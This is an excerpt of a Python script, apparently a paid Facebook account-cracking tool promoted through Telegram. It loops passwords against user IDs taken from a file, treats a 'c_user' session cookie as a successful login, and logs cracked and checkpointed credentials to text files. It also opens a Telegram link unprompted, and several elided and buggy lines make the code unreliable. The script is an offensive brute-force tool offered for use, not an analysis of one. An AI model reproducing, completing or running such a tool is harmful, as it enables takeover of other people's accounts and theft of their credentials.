...
\33[1;32m  TELGRAM : @tarmay_shaw1
\33[1;32m  GITHUB :  NO
\33[1;32m  CHANNEL : @krd_crackers
\33[1;32m  VERSION : 1.0
\33[1;32m  THIS TOOL IS PAID【5$】
"""
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mTARMAY-OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mTARMAY-CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPRESS ENTER TO BACK TARMAY MENU ")
	    Tarmay()
...
def Tarmay():
    ...
    todz = ''
    print
    print('    \x1b[1;32m1 CRACK BA FILE')
    print('   \033[1;91m ---------------------------') 
    _Tarmay___ = input('    \x1b[1;34mHALBZHERA: ')
    if _Tarmay___ in ('1', '01'):
        __xxx__().Tarmayi(id)
    os.system("xdg-open https://t.me/HR_STAF666 ")
class __xxx__:
    def __init__(self):
        self.id = []
    def Tarmayi(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input(' \033[1;32mFILE DANE : ')
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;32m[TARMAY] \x1b[1;34m{loop}|\x1b[1;32m{len(self.id)} \x1b[1;92m{len(ok)}\x1b[1;32m/\x1b[1;31m{len(cp)}")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [TARMAY-OK︎] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('TARMAY-OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [TARMAY-CP︎] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('TARMAYCP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        print('\033[1;32m[1] \033[1;32m CARCKY BAHEZ ')
        print('\033[1;31m-----------------------------------------------')
